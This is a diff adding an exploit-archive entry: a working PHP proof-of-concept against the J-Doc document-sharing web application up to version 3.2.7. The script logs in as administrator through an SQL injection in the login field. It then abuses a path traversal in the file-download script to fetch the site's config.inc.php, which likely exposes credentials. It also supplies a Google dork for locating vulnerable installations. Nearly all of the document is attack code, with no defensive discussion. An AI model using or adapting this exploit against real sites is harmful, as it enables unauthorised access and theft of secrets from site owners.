@@ -1,0 +1,56 @@
+id: 19161
+date: 08/10/2012
+title: J-Doc <= v3.2.7 SQL Injection + Arbitrary download file
+author: leviathan
+cves: 
+
+<?php
+# Exploit Title: J-Doc <= v3.2.7 : SQL Injection + Arbitrary download file
+# Date: 2012-08-10
+# Author: leviathan
+# Vendor or Software Link: http://www.j-doc.com/
+# Version: <= 3.2.7
+# Category:: webapps
+# Google dork: intext:"Système de partage de documents par Projet"
+# Tested on: GNU/Linux with TeamPass 3.2.7 - PHP 5.3.2 with magic_quotes = 0
+# Demo site: 
+
+
+// The vulnerable website
+$base_url = 'http://localhost';
+$folder   = '/jdoc/';
+$file_to_download = '../config.inc.php'; // related to the stock_fichiers/fichiers_objet folder
+
+// Use cookies to keep connection
+$cookies_file = __DIR__.DIRECTORY_SEPARATOR.'cookiesjdoc';
+if (file_exists($cookies_file) === true) {
+  unlink($cookies_file);
+}
+
+// The SQLi to login as administrator
+$post_array = array('login' => 'lol\' or id_utilisateur = 1 -- ', 'password' => 'lol');
+
+// Connection
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, $base_url.$folder.'index.php');
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_COOKIEJAR, $cookies_file);
+curl_setopt($curl, CURLOPT_POSTFIELDS, $post_array);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$output = curl_exec($curl);
+
+if ($output != '<script type="text/javascript">  window.location.replace("'.$folder.'module_fichier/");  </script>') {
+  die('error in the exploit');
+}
+
+// Get the configuration file
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, $base_url.$folder.'/divers/fichier_joint_telecharger.php?module_dossier=module_fichier&id_fichier=../config.inc.php');
+curl_setopt($curl, CURLOPT_COOKIEFILE, $cookies_file);
+$response = curl_exec($curl);
+
+echo $response;
+
+
+
+#  0day.today [2023-03-24]  #
